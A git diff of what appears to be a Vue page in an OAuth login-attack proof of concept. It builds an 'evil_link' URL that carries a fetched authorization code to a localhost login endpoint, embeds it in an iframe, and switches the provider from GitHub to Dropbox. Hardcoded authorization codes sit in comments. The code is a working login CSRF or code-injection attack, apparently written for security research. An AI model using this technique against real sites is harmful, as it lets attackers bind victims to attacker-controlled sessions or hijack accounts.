@@ -10,10 +10,10 @@
           </iframe> -->
   
           <!-- <iframe src="http://localhost:8080/login?code=4a0622b77c02948efe30&amp;login_method=githubLoginSF" style="width:100%;"> -->
-          <!-- <iframe src="http://localhost:8080/login?code=a89ef531c4487acde0c0&amp;login_method=githubLoginSF" style="width:100%;"> -->
+          <!-- <iframe src="http://localhost:8080/login?code=bSRDN66vg_AAAAAAAAAAHCOA1TiFAOwmr4iQO5yaI0M&amp;login_method=DropboxSF" style="width:100%;"> -->
           <!-- <iframe :src=evil_link2 style="width:100%;">
           </iframe> -->
-  
+          <!-- <iframe src='http://localhost:8080/login?code=bSRDN66vg_AAAAAAAAAAHCOA1TiFAOwmr4iQO5yaI0M&amp;login_method=DropboxSF' style="width:100%;"></iframe> -->
           <iframe :src=evil_link style="width:100%;">
           </iframe>
       <div>
@@ -64,8 +64,10 @@
                       const code = resData.data;
                       console.log("code",code)
                       // evil_link.value = `http://localhost:8080/login?state=state&code=${code}&login_method=twitterLoginSF`
-                      // evil_link.value = 'http://localhost:8080/login?code=a89ef531c4487acde0c0&login_method=githubLoginSF'
-                      evil_link.value = `http://localhost:8080/login?code=${code}&login_method=githubLoginSF`
+                      // evil_link.value = 'http://localhost:8080/login?code=bSRDN66vg_AAAAAAAAAAHUgZogADBXIrpK4EHM3jh6E&login_method=DropboxSF'
+                      // evil_link.value = `http://localhost:8080/login?code=${code}&login_method=githubLoginSF`
+                      evil_link.value = `http://localhost:8080/login?code=${code}&login_method=DropboxSF`
+                      
                       // console.log(evil_link.value)
                   } else {
                   alert('Unknown Error Occurs');
